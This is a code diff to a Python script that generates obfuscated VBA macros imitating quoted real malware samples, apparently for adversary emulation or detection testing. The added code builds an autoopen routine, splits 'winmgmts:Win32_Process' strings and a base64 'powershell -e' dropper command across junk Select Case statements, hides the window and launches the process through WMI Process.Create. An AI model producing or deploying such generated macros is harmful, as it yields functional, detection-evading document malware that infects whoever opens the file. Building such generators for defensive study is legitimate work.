@@ -69,6 +69,15 @@ def generate_nonsense_case_statement():
                 "End Select\r\n"
     return case_vba
 
+def get_cases(min, max):
+    return_vba = ''
+    case_counter = 0
+    cases_to_insert = random.randint(min, max)
+    while case_counter < cases_to_insert:
+        return_vba = return_vba + generate_nonsense_case_statement()
+        case_counter = case_counter + 1
+    return return_vba
+
 def generate_nonsense_function():
     function_vba = "Function {}()\r\n".format(get_new_variable_name())
     number_of_cases = random.randint(6, 17)
@@ -86,7 +95,7 @@ ff02.olevba:F29__4 = i_0_04_2 + "winmgmts:Win32" + i_16__ + "_Process" + z510_1
 '''
 def generate_obfuscated_win32_process():
     this_var_name = get_new_variable_name()
-    vba_line = "{} = {} + \"winmgmts:Win32\" + {} + \"_Process\" + {}".format(
+    vba_line = "{} = {} + \"winmgmts:Win32\" + {} + \"_Process\" + {}\r\n".format(
         this_var_name,
         get_new_variable_name(),
         get_new_variable_name(),
@@ -102,7 +111,7 @@ ff02.olevba:Set U9814_2_ = GetObject(A_12_92 + v1991998 + U__5062)
 '''
 def generate_win32_process_startup_object(win32_process_var_name):
     process_startup_var = get_new_variable_name()
-    vba_line = "{} = GetObject({} + {} + {})".format(
+    vba_line = "{} = GetObject({} + {} + {})\r\n".format(
         process_startup_var,
         get_new_variable_name(),
         win32_process_var_name,
@@ -112,13 +121,30 @@ def generate_win32_process_startup_object(win32_process_var_name):
             "vba_line": vba_line}
 
 '''
+77ac.olevba:S04___.ShowWindow = f_550386 + 717454 - 717454 + m0382_7
+846f.olevba:Z1790_07.ShowWindow = O_9_556 + 73271 - 73271 + J66_38
+ff02.olevba:U9814_2_.ShowWindow = G23_1_ + 952579 - 952579 + U9___08
+'''
+
+def generate_win32_process_startup_showwindow(win32_process_startup_var_name):
+    number_to_subtract_from_itself = str(random.randint(30000, 99999))
+    vba_line = '{}.ShowWindow = {} + {} - {} + {}\r\n'.format(
+        win32_process_startup_var_name,
+        get_new_variable_name(),
+        number_to_subtract_from_itself,
+        number_to_subtract_from_itself,
+        get_new_variable_name()
+    )
+    return vba_line
+
+'''
 77ac.olevba:i253_50_ = X159_269 + "winmgmts:Win32" + s47661 + "_ProcessStartup" + M2_65_
 846f.olevba:O1_161 = L10517 + "winmgmts:Win32" + "_ProcessStartup" + J597_154
 ff02.olevba:v1991998 = w5_34067 + "winmgmts:Win32" + Q_51_0_3 + "_ProcessStartup" + S72405
 '''
 def generate_obfuscated_win32_process_startup():
     this_var_name = get_new_variable_name()
-    vba_line = "{} = {} + \"winmgmts:Win32\" + {} + \"_ProcessStartup\" + {}".format(
+    vba_line = "{} = {} + \"winmgmts:Win32\" + {} + \"_ProcessStartup\" + {}\r\n".format(
         this_var_name,
         get_new_variable_name(),
         get_new_variable_name(),
@@ -133,8 +159,9 @@ def generate_obfuscated_win32_process_startup():
 ff02.olevba:M825_2_ = GetObject(l073__1 + F29__4 + L78059).Create((s064___ + p84753 + Q86977_ + F6_1_55 + K7_9413), m82_5009, U9814_2_, E_10_47_)
 '''
 def generate_process_create(win32_process_varname, win32_process_startup_varname, reassembly_function_name):
-    vba_line = "{} = GetObject({} + {} + {}).Create(({} + {} + {} + {} + {} + {}), {}, {}, {})".format(
-        get_new_variable_name(),
+    process_create_function_name = get_new_variable_name()
+    vba_line = "{} = GetObject({} + {} + {}).Create(({} + {} + {} + {} + {} + {}), {}, {}, {})\r\n".format(
+        process_create_function_name,
         get_new_variable_name(),
         win32_process_varname,
         get_new_variable_name(),
@@ -145,25 +172,13 @@ def generate_process_create(win32_process_varname, win32_process_startup_varname
         get_new_variable_name(),
         get_new_variable_name(),
         get_new_variable_name(),
-        win32_process_startup_varname(),
+        win32_process_startup_varname,
         get_new_variable_name()
     )
+    return vba_line
 
 def generate(dropperbase64):
     playbook = list()
-    utility_variables_list = ['win32_process_startup',
-                              'win32_process',
-                              'main_func',  # Function 10_1__ in sample 77ac
-                              'main_func_arg',  # o7_572_ in sample 77ac
-                              'reassembly_func',
-                              'create',
-                              'dummy_function_1',
-                              'dummy_function_2',
-                              'dummy_function_3',
-                              ]
-
-    payloadvariables = []
-    utilityvariables = {}
 
     process_creation_args = "rsheLl -e "
     remaining = process_creation_args + dropperbase64
@@ -217,11 +232,7 @@ def generate(dropperbase64):
             number_of_reassemblies_this_function = len(reassembly_tier_2_vba)
         reassembly_vba = reassembly_vba + "Function {}()\r\n".format(this_function_name)
         while new_function_counter < number_of_reassemblies_this_function and len(reassembly_tier_2_vba) > 0:
-            case_counter = 0
-            cases_to_insert = random.randint(1, 3)
-            while case_counter < cases_to_insert:
-                reassembly_vba = reassembly_vba + generate_nonsense_case_statement()
-                case_counter = case_counter + 1
+            reassembly_vba = reassembly_vba + get_cases(min=1, max=3)
             reassembly_vba = reassembly_vba + reassembly_tier_2_vba[0]
             reassembly_tier_2_vba = reassembly_tier_2_vba[1:]
             new_function_counter = new_function_counter + 1
@@ -230,15 +241,71 @@ def generate(dropperbase64):
             ' + '.join(reassembly_tier_2_vars[0:number_of_reassemblies_this_function])
         )
         reassembly_tier_2_vars = reassembly_tier_2_vars[number_of_reassemblies_this_function:]
+        reassembly_vba = reassembly_vba + get_cases(min=1, max=3)
         reassembly_vba = reassembly_vba + "End Function\r\n"
 
-    print(reassembly_tier_1_funcs)
+    ## create the special variables needed to create a process
 
-    playbook.append({'add_vba_module': vba})
+    reassembly_function_name = get_new_variable_name()
+    reassembly_function_arg = get_new_variable_name()
 
+    process_creation_vba = process_creation_vba + "Function {}({}, {})\r\nOn Error Resume Next\r\n".format(
+        reassembly_function_name,
+        reassembly_function_arg,
+        get_new_variable_name()
+    )
+
+    process_creation_vba = process_creation_vba + get_cases(min=2, max=4)
+
+    win32_process_obfuscated_string = generate_obfuscated_win32_process()
+    win32_process_startup_obfuscated_string = generate_obfuscated_win32_process_startup()
+
+
+    process_creation_vba = process_creation_vba + win32_process_obfuscated_string['vba_line']
+    process_creation_vba = process_creation_vba + get_cases(min=4, max=7)
+    process_creation_vba = process_creation_vba + win32_process_startup_obfuscated_string['vba_line']
+    process_creation_vba = process_creation_vba + get_cases(min=4, max=7)
+    process_creation_vba = process_creation_vba + generate_win32_process_startup_showwindow(
+        win32_process_startup_obfuscated_string['var']
+    )
+    process_creation_vba = process_creation_vba + get_cases(min=4, max=7)
+    process_creation_vba = process_creation_vba + generate_process_create(
+        win32_process_varname=win32_process_obfuscated_string['var'],
+        win32_process_startup_varname=win32_process_startup_obfuscated_string['var'],
+        reassembly_function_name=reassembly_function_arg
+    )
+    process_creation_vba = process_creation_vba + get_cases(min=4, max=7)
+    process_creation_vba = process_creation_vba + "End Function\r\n"
+
+
+    ## create auto_open
+
+    auto_open_vba = auto_open_vba + "Sub autoopen()\r\nOn Error Resume Next\r\n"
+
+    auto_open_vba = auto_open_vba + get_cases(2, 4)
+
+    auto_open_vba = auto_open_vba + "{} {} + \"powe\" + {}, {} + {} + {} + {}\r\n".format(
+        reassembly_function_name,
+        get_new_variable_name(),
+        " + ".join(reassembly_tier_1_funcs),
+        get_new_variable_name(),
+        get_new_variable_name(),
+        get_new_variable_name(),
+        get_new_variable_name()
+    )
+
+    auto_open_vba = auto_open_vba + get_cases(2, 4)
+
+    auto_open_vba = auto_open_vba + "End Sub\r\n"
+    vba = vba + reassembly_vba
+    vba = vba + process_creation_vba
+    vba = vba + auto_open_vba
+
+
+    #  cleanup and return
     used_variable_names = []
+    playbook.append({'add_vba_module': vba})
     return playbook
-
 
 if __name__ == '__main__':
     # print(generate_variable_name())
